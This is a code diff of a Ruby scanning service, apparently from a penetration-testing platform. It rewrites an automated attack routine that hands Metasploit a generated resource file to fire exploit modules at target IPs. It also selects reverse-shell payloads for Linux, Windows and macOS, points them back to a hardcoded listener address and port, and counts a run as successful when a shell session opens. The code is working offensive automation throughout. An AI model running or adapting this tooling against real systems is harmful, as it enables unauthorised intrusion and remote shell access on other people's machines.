@@ -1,6 +1,7 @@
 require 'json'
 require 'socket'
-require 'msfrpc-client'
+require 'open3'
+require 'tempfile'
 require 'timeout'
 require 'net/smtp'
 require 'thread'
@@ -138,66 +139,72 @@ class ScanService
 
   def attack(exploit, target_ip, port, proxy = nil)
     effective_port = @scan_options[:port_override].presence || port
-    timeout_secs   = @scan_options[:timeout].presence || 120
-    puts "Attacking #{target_ip}:#{effective_port} with exploit: #{exploit['name']}#{proxy ? " via #{proxy}" : " (direct)"}..."
+    timeout_secs   = (@scan_options[:timeout].presence || 120).to_i
+
+    rc_file  = Tempfile.new(['aegis_', '.rc'])
+    log_file = Tempfile.new(['aegis_out_', '.txt'])
 
     begin
-      Timeout.timeout(timeout_secs.to_i) do
-        rpc = Msf::RPC::Client.new(
-          host: ENV.fetch('MSF_HOST', '127.0.0.1'),
-          port: ENV.fetch('MSF_PORT', '55553').to_i,
-          ssl:  ENV.fetch('MSF_SSL', 'true') == 'true',
-          user: ENV.fetch('MSF_USER', 'msf'),
-          pass: ENV.fetch('MSF_PASS', 'password')
-        )
+      rc_file.write(build_resource_file(exploit, target_ip, effective_port, proxy))
+      rc_file.flush
 
-        options = {
-          'RHOSTS'  => target_ip,
-          'RPORT'   => effective_port.to_s,
-          'PAYLOAD' => exploit['default_payload'].presence || 'linux/x86/shell/reverse_tcp',
-          'LHOST'   => ENV.fetch('MSF_LHOST', '100.69.88.107'),
-          'LPORT'   => ENV.fetch('MSF_LPORT', '4444')
-        }
-        options['Proxies'] = proxy if proxy
+      puts "Launching msfconsole for #{target_ip}:#{effective_port} [#{exploit['name']}]#{proxy ? " via #{proxy}" : " (direct)"}"
+      pid = Process.spawn(
+        'msfconsole', '-q', '--no-readline', '-r', rc_file.path,
+        [:out, :err] => log_file.path
+      )
 
-        res = rpc.call('module.execute', 'exploit', exploit['metasploit_module'], options)
-
-        puts "Exploit launched (Job ID: #{res['job_id']}). Waiting for session..."
-
-        session_pair = nil
-        10.times do
-          sessions = rpc.call('session.list')
-          session_pair = sessions.find { |_id, s| s['target_host'] == target_ip }
-          break if session_pair
-          sleep(3)
-        end
-
-        if session_pair
-          session_id = session_pair[0]
-          puts "Exploit successful! Session established (ID: #{session_id})."
-          details  = get_session_details(rpc, session_id)
-          evidence = details ? "Session #{session_id}: #{details['info']}" : "Session #{session_id} established"
-          return { success: true, evidence: evidence }
-        else
-          puts "Exploit unsuccessful (no session)."
-          return { success: false, evidence: nil }
-        end
+      begin
+        Timeout.timeout(timeout_secs + 10) { Process.wait(pid) }
+      rescue Timeout::Error
+        Process.kill('TERM', pid) rescue nil
+        Process.wait(pid) rescue nil
       end
-    rescue Timeout::Error
-      puts "Attack timed out."
-      return { success: false, evidence: nil }
-    rescue => e
-      puts "Attack failed: #{e.message}"
-      return { success: false, evidence: nil }
+
+      output  = File.read(log_file.path)
+      success = output.match?(/session \d+ opened|Meterpreter session|Command shell session/i)
+      evidence_lines = output.scan(/\[\+\].*|.*session \d+ opened.*/i).join("\n")
+      evidence = evidence_lines.length > 500 ? evidence_lines[0, 500] : evidence_lines
+      { success: success, evidence: evidence.presence || (success ? 'Session established' : nil) }
+    ensure
+      rc_file.close!   rescue nil
+      log_file.close!  rescue nil
     end
+  rescue => e
+    puts "Attack failed: #{e.message}"
+    { success: false, evidence: nil }
   end
 
-  def get_session_details(rpc, session_id)
-    sessions = rpc.call('session.list')
-    return sessions[session_id.to_s]
-  rescue => e
-    puts "Error getting session details: #{e.message}"
-    return nil
+  def build_resource_file(exploit, target_ip, port, proxy)
+    lhost   = ENV.fetch('MSF_LHOST', '100.69.88.107')
+    lport   = ENV.fetch('MSF_LPORT', '4444')
+    payload = exploit['default_payload'].presence || default_payload_for(exploit)
+
+    lines = [
+      "use #{exploit['metasploit_module']}",
+      "set RHOSTS #{target_ip}",
+      "set RPORT #{port}",
+      "set PAYLOAD #{payload}",
+      "set LHOST #{lhost}",
+      "set LPORT #{lport}",
+      "set ExitOnSession false",
+      "set ConnectTimeout 15",
+      (proxy ? "set Proxies #{proxy}" : nil),
+      "run -z",
+      "sleep 5",
+      "sessions -l",
+      "exit -y"
+    ].compact
+    lines.join("\n") + "\n"
+  end
+
+  def default_payload_for(exploit)
+    mod = exploit['metasploit_module'].to_s
+    if    mod.include?('windows') then 'windows/x64/shell/reverse_tcp'
+    elsif mod.include?('osx')     then 'osx/x64/shell_reverse_tcp'
+    elsif mod.include?('apple')   then 'osx/x64/shell_reverse_tcp'
+    else  'linux/x86/shell/reverse_tcp'
+    end
   end
 
   def create_scan_target(asset_id)
